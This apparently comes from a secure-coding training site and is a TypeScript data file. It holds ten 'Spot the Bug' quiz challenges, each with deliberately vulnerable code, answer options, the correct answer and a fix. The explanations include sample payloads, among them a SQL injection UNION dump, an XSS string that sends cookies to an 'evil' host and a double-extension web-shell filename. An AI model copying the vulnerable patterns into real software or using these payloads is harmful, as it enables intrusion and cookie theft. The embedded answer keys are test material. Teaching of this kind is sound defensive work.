// ============================================================
// SecureDevHub — "Spot the Bug" playground challenges
// ============================================================
import type { Challenge } from "./types";

export const CHALLENGES: Challenge[] = [
  {
    id: "pg-sqli",
    title: "The Concatenated Query",
    difficulty: "Easy",
    category: "SQL Injection",
    code: {
      lang: "javascript",
      snippet: `// routes/users.js — find a user by id
const query =
  "SELECT * FROM users WHERE id = " + req.query.id;
db.query(query, (err, rows) => res.json(rows));`,
    },
    options: [
      "Cross-Site Scripting — the response isn't escaped",
      "SQL Injection — user input is concatenated into the query",
      "Broken authentication — no login check",
      "Missing security headers",
    ],
    correct: 1,
    why: "req.query.id flows straight into the SQL string. A request like /users?id=1 OR 1=1 UNION SELECT username, password FROM users-- turns the query into a data dump. Numbers were 'expected', but attackers don't send what you expect.",
    fix: {
      lang: "javascript",
      snippet: `// Parameterize — the value can never become SQL
const query = "SELECT * FROM users WHERE id = ?";
const id = Number.parseInt(req.query.id, 10);
if (!Number.isInteger(id)) return res.status(400).send("bad id");
db.query(query, [id], (err, rows) => res.json(rows));`,
    },
  },
  {
    id: "pg-xss",
    title: "Welcome Banner",
    difficulty: "Easy",
    category: "XSS",
    code: {
      lang: "javascript",
      snippet: `// Show a greeting after OAuth login redirect
const name = new URLSearchParams(location.search).get("user");
document.getElementById("banner").innerHTML =
  "<h1>Welcome, " + name + "</h1>";`,
    },
    options: [
      "Open redirect — location.search trusts any URL",
      "CSRF — no token in the request",
      "DOM-based XSS — unsanitized user input reaches innerHTML",
      "Clickjacking — the page can be framed",
    ],
    correct: 2,
    why: "The ?user= parameter (a DOM source) is written to innerHTML (a DOM sink). ?user=<img src=x onerror=fetch('//evil/?c='+document.cookie)> executes script in your origin. No server round-trip is even involved.",
    fix: {
      lang: "javascript",
      snippet: `const name = new URLSearchParams(location.search).get("user");
const banner = document.getElementById("banner");
banner.textContent = "Welcome, " + name;   // text, never markup`,
    },
  },
  {
    id: "pg-auth",
    title: "Password Check",
    difficulty: "Medium",
    category: "Authentication",
    code: {
      lang: "javascript",
      snippet: `// auth.js — user login
const user = await db.users.findOne({ email });
if (!user) return res.status(401).send("unknown user");
if (password === user.password) {
  return login(user);          // "passwords matched!"
}
return res.status(401).send("wrong password");`,
    },
    options: [
      "SQL Injection in findOne",
      "Passwords compared in plaintext + user enumeration via distinct errors",
      "Missing rate limiting is the only issue",
      "The comparison should use == instead of ===",
    ],
    correct: 1,
    why: "Two bugs. (1) user.password in the database is plaintext — a breach recovers every account instantly; store bcrypt/argon2 hashes and compare with bcrypt.compare. (2) The two different 401 messages let attackers enumerate registered emails.",
    fix: {
      lang: "javascript",
      snippet: `const user = await db.users.findOne({ email });
const hash = user?.passwordHash ?? DUMMY_HASH;  // constant timing
const ok = await bcrypt.compare(password, hash);
if (!user || !ok)
  return res.status(401).send("Invalid credentials");
return login(user);`,
    },
  },
  {
    id: "pg-csrf",
    title: "The Helpful Transfer Form",
    difficulty: "Medium",
    category: "CSRF",
    code: {
      lang: "html",
      snippet: `<!-- bank.example/transfer — rendered when logged in -->
<form action="/transfer" method="POST">
  <input name="to" placeholder="IBAN">
  <input name="amount" type="number">
  <button>Send money</button>
</form>
<!-- session cookie: SameSite not set, no token anywhere -->`,
    },
    options: [
      "XSS — placeholder attributes are unescaped",
      "No CSRF token — any site can forge this POST with the victim's cookies",
      "Form data travels unencrypted",
      "The button is missing type=\"submit\"",
    ],
    correct: 1,
    why: "Nothing ties the request to a page your app rendered. An attacker's page with an auto-submitting clone of this form sends money using the victim's ambient cookies. A per-session token (plus SameSite) breaks the forgery.",
    fix: {
      lang: "html",
      snippet: `<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input name="to" placeholder="IBAN">
  <input name="amount" type="number">
  <button>Send money</button>
</form>
<!-- + SameSite=Lax & Secure on the session cookie,
     + server verifies _csrf against the session -->`,
    },
  },
  {
    id: "pg-headers",
    title: "The Bare API",
    difficulty: "Medium",
    category: "Security Headers",
    code: {
      lang: "javascript",
      snippet: `// server.js
app.use(express.static("public"));
app.get("/profile", (req, res) => {
  res.send(userContent);      // user-controlled HTML content
});`,
    },
    options: [
      "CSRF — the GET handler changes state",
      "The route order is wrong",
      "Directory traversal in express.static",
      "No security headers — injected scripts run, uploads can sniff types, page can be framed",
    ],
    correct: 3,
    why: "With no CSP, any injected <script> executes and can fetch() data anywhere; without X-Content-Type-Options: nosniff a crafted upload may render as HTML; without frame-ancestors the page is clickjackable. Serving user content with Content-Type: text/html and no CSP is the core mistake.",
    fix: {
      lang: "javascript",
      snippet: `import helmet from "helmet";
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
}));
app.get("/profile", (req, res) => {
  res.type("text/plain").send(userContent); // don't render as HTML
});`,
    },
  },
  {
    id: "pg-session",
    title: "One Cookie, Please",
    difficulty: "Hard",
    category: "Session",
    code: {
      lang: "javascript",
      snippet: `// after successful login
app.post("/login", (req, res) => {
  // ... credentials verified ...
  res.cookie("sid", sessionId, {
    maxAge: 30 * 24 * 3600 * 1000,   // 30 days
  });
  res.redirect("/dashboard");
});`,
    },
    options: [
      "The redirect is open to abuse",
      "JWT should have been used instead of cookies",
      "Missing Secure, HttpOnly and SameSite flags — the cookie is sniffable, readable by XSS, and rides cross-site requests",
      "30-day maxAge is too short",
    ],
    correct: 2,
    why: "Every transport/encoding defense for the session lives in these flags: without Secure the ID flies over HTTP on open Wi-Fi; without HttpOnly any XSS reads document.cookie; without SameSite it's attached to forged cross-site requests (CSRF). The 30-day lifetime then maximizes the theft window.",
    fix: {
      lang: "javascript",
      snippet: `res.cookie("__Host-sid", sessionId, {
  httpOnly: true,      // invisible to JavaScript
  secure: true,        // HTTPS only
  sameSite: "lax",     // no cross-site POSTs
  maxAge: 15 * 60 * 1000,   // 15-minute idle window
});`,
    },
  },
  {
    id: "pg-secrets",
    title: "Some Assembly Required",
    difficulty: "Easy",
    category: "Secrets",
    code: {
      lang: "javascript",
      snippet: `// src/api.js — shipped in the front-end bundle
const API_KEY = "sk_live_51HqLyjWDarjtT1zdp7dc3f7g";
export async function chargeCard(amount) {
  return fetch("https://api.stripe.com/v1/charges", {
    method: "POST",
    headers: { Authorization: "Bearer " + API_KEY },
    body: new URLSearchParams({ amount }),
  });
}`,
    },
    options: [
      "CORS will strip the header",
      "Secret API key exposed in client-side code — any visitor can extract and use it",
      "The fetch lacks await",
      "URLSearchParams is deprecated",
    ],
    correct: 1,
    why: "Everything in the client bundle is public. sk_live_ keys charge cards and read customer data — a scraper will find this in minutes. Frontend code may only ever contain publishable keys; secret operations must live on your server.",
    fix: {
      lang: "javascript",
      snippet: `// Front-end: use the PUBLISHABLE key only
const stripe = Stripe("pk_live_51HqLyjWDarjtT1zdp7");
// Secret key lives on the server:
// app.post("/api/intent", auth, async (req, res) => {
//   const intent = await stripe.paymentIntents.create({...});
//   res.json({ clientSecret: intent.client_secret });
// });`,
    },
  },
  {
    id: "pg-upload",
    title: "JPEGs Only",
    difficulty: "Medium",
    category: "File Upload",
    code: {
      lang: "javascript",
      snippet: `app.post("/avatar", upload.single("file"), (req, res) => {
  if (!req.file.originalname.endsWith(".jpg")) {
    return res.status(400).send("JPEGs only, sorry");
  }
  saveToWebroot("public/uploads/" + req.file.originalname, req.file);
  res.send("uploaded!");
});`,
    },
    options: [
      "No file size limit is the only problem",
      "Only the extension is checked — content, name and storage are all attacker-controlled",
      "single() should be array()",
      "Nothing — extension checks are sufficient",
    ],
    correct: 1,
    why: "shell.php.jpg satisfies endsWith. The original name also enables path traversal (../../) and overwrites; saving into public/uploads means a web shell is one crafted double-extension away from executing. Names lie — inspect content.",
    fix: {
      lang: "javascript",
      snippet: `const type = await fileTypeFromBuffer(req.file.buffer);
if (!type || !["image/jpeg", "image/png"].includes(type.mime))
  return res.status(400).send("invalid image");
const name = crypto.randomUUID() + ".jpg";
await s3.putObject({ Bucket: AVATARS, Key: name,
  Body: await sharp(req.file.buffer).resize(512, 512).toBuffer(),
  ContentDisposition: "attachment" });
// stored outside webroot, served from a static domain`,
    },
  },
  {
    id: "pg-cors",
    title: "Helpful CORS Fix",
    difficulty: "Medium",
    category: "CORS",
    code: {
      lang: "javascript",
      snippet: `// A dev gets "blocked by CORS policy" and fixes it:
app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", req.headers.origin || "*");
  res.set("Access-Control-Allow-Credentials", "true");
  next();
});`,
    },
    options: [
      "OPTIONS preflights aren't handled",
      "This is fine — credentials shares cookies intentionally",
      "Reflecting any Origin with credentials on — every website can read authenticated responses",
      "The wildcard should have quotes",
    ],
    correct: 2,
    why: "Echoing req.headers.origin turns the server into a universal yes-man: evil.com's fetch('/me', { credentials: 'include' }) now reads your logged-in users' data. Browsers only block '*' + credentials; reflection is the manual bypass.",
    fix: {
      lang: "javascript",
      snippet: `const ALLOWED = new Set(["https://app.example.com"]);
app.use((req, res, next) => {
  const o = req.headers.origin;
  if (o && ALLOWED.has(o)) {
    res.set("Access-Control-Allow-Origin", o);
    res.set("Access-Control-Allow-Credentials", "true");
    res.set("Vary", "Origin");
  }
  next();
});`,
    },
  },
  {
    id: "pg-jwt",
    title: "Trusting Tokens",
    difficulty: "Hard",
    category: "JWT",
    code: {
      lang: "javascript",
      snippet: `// middleware/auth.js (old jsonwebtoken version)
app.use((req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).send("nope");
  const payload = jwt.decode(token);        // ← the bug
  req.user = payload;
  next();
});`,
    },
    options: [
      "Tokens aren't rotated",
      "jwt.decode doesn't verify signatures — anyone can forge any claims, including admin",
      "Bearer tokens should go in cookies",
      "split() will throw on malformed headers",
    ],
    correct: 1,
    why: "decode just Base64-parses the payload — no signature check at all. Attacker forges {id:1, role:'admin'} in seconds. Even jwt.verify has pitfalls when the algorithm isn't pinned (alg:none confusion in older libs).",
    fix: {
      lang: "javascript",
      snippet: `const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ["HS256"],        // never accept alg:none
  issuer: "securedevhub",
  maxAge: "15m",
});
req.user = payload;`,
    },
  },
];

/* ---------- storage helpers ---------- */
import { store } from "../lib/utils";

export function solvedChallenges(): string[] {
  return store.get<string[]>("sdh_pg_solved", []);
}
export function markSolved(id: string): void {
  const s = solvedChallenges();
  if (!s.includes(id)) {
    store.set("sdh_pg_solved", [...s, id]);
    window.dispatchEvent(new Event("sdh-progress"));
  }
}
export function resetChallenges(): void {
  store.set("sdh_pg_solved", []);
  window.dispatchEvent(new Event("sdh-progress"));
}
